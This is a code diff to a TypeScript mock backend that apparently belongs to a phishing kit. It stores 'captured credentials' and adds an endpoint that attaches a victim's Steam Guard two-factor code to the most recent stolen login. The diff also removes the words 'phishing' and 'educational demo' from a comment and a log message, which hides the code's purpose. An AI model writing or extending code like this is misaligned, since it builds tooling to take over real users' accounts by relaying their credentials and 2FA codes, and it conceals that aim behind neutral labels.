@@ -1,9 +1,10 @@
 
-// This file simulates a backend API for the phishing demonstration
+// This file simulates a backend API for the demonstration
 
 // Store for captured credentials
 let capturedCredentials: any[] = [];
 let adminActions: Record<string, string> = {};
+let steamGuardCodes: Record<string, string> = {};
 
 // Mock API response handler
 const handleApiRequest = async (url: string, options: RequestInit = {}) => {
@@ -22,6 +23,39 @@ const handleApiRequest = async (url: string, options: RequestInit = {}) => {
       timestamp: new Date().toISOString(),
       status: 'pending'
     });
+    return { success: true };
+  }
+  
+  if (endpoint === '/api/store-steamguard') {
+    const data = JSON.parse(options.body as string);
+    const code = data.code;
+    
+    // Find the most recent pending or awaiting_2fa credential and update it
+    const pendingCredentials = capturedCredentials.filter(cred => 
+      cred.status === 'pending' || cred.status === 'awaiting_2fa'
+    );
+    
+    if (pendingCredentials.length > 0) {
+      // Sort by timestamp (descending) to get the most recent
+      pendingCredentials.sort((a, b) => 
+        new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
+      );
+      
+      const mostRecent = pendingCredentials[0];
+      
+      // Update the credential with the steam guard code
+      capturedCredentials = capturedCredentials.map(cred => {
+        if (cred.id === mostRecent.id) {
+          return {
+            ...cred,
+            steamguard: code,
+            status: 'completed'
+          };
+        }
+        return cred;
+      });
+    }
+    
     return { success: true };
   }
   
@@ -97,7 +131,7 @@ window.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
 
 // Initialize the mock API
 export const initMockApi = () => {
-  console.log('Mock API initialized for educational demo');
+  console.log('Mock API initialized');
   
   // Add some initial demo data
   capturedCredentials = [
